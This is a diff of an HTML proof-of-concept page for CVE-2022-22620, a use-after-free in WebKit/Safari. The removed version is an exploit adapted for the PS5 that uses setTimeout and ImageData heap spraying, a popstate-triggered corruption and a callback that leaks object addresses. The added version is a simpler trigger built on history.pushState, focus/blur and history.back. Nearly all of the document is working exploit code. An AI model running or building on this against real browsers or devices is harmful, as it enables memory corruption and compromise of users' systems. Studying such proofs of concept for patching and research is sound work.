@@ -1,74 +1,43 @@
-<!DOCTYPE html>
 <html>
-<head>
-    <title>PoC Adaptado PS5 - CVE-2022-22620</title>
-    <style>body { background-color: #111; color: #0f0; text-align: center; }</style>
-</head>
-<body>
-    <h1>Test UAF WebKit (PS5 Adaptado)</h1>
-    <button onclick="runExploit()">Run Exploit</button>
+    <head>
+        <title>CVE-2022-22620: Use-after-free in Safari</title>
+        <script>
+        function test_poc_safari()
+        {
+            
+                input = document.body.appendChild(document.createElement("input"));
 
-    <script>
-        const x = [1.1];
-        const buffer = new ArrayBuffer(8);
-        const u8 = new Uint8Array(buffer);
-        const u32 = new Uint32Array(buffer);
-        const f64 = new Float64Array(buffer);
+                foo = document.body.appendChild(document.createElement("a"));
+                foo.id = "foo";
 
-        function leakCallback(leaked) {
-            if (leaked !== x) {
-                f64[0] = leaked;
-                let leak = "0x" + (u32[1] | 0x20000).toString(16) + (u32[0] >>> 8).toString(16);
-                alert("Objeto filtrado: " + leak);
-            }
-        }
+                // Go to state1 when history.back is called
+                // The URL needs to be <currentPage+hash> to trigger loadInSameDocument during the call to back()
+                // Since the foo's element id="foo", focus will change to that element
+                history.pushState("state1", "", location + "#foo");
 
-        function dummy() {}
-
-        function runExploit() {
-            let input = document.createElement("input");
-            document.body.appendChild(input);
-
-            let link = document.createElement("a");
-            link.id = "foo";
-            document.body.appendChild(link);
-
-            for (let i = 0; i < 1000; i++) {
-                setTimeout(dummy, 0, 0x61, 0x61);
-            }
-
-            history.pushState({}, "", location + "#foo");
-
-            for (let i = 0; i < 1000; i++) {
-                setTimeout(dummy, 0, 0x61, 0x61);
-            }
-
-            history.pushState({}, "", location);
-
-            setTimeout(() => {
-                input.focus();
-                input.onblur = () => {
-                    history.replaceState({}, "", location);
-                };
+                // Current state = state2
+                history.pushState("state2", "");
 
                 setTimeout(() => {
-                    history.back();
-                }, 500);
 
-                // Trigger PopStateEvent memory corruption
-                window.addEventListener('popstate', () => {
-                    for (let i = 0; i < 15000; i++) {
-                        setTimeout(leakCallback, 100, x);
-                    }
+                        // Set the focus on the input element.
+                        // During the call to back() the focus will change to the foo element 
+                        // and therefore triggering the blur event on the input element
+                        input.focus(); 
+                        input.onblur = () => history.replaceState("state3", "");
+                        setTimeout(() => history.back(), 1000);
+                }, 1000);
 
-                    setInterval(() => {
-                        for (let i = 0; i < 2000; i++) {
-                            new ImageData(1, 96 / 4);
-                        }
-                    }, 1000);
-                });
-            }, 500);
+               
+                
+           
+
         }
-    </script>
-</body>
-</html>
+     </script>
+     <body>
+        <h1>CVE-2022-22620: Use-after-free in Safari</h1>
+        <center><button onclick="test_poc_safari();"> Test CVE-2022-22620 </button></center>
+     </body>
+
+    </head>
+   </html>
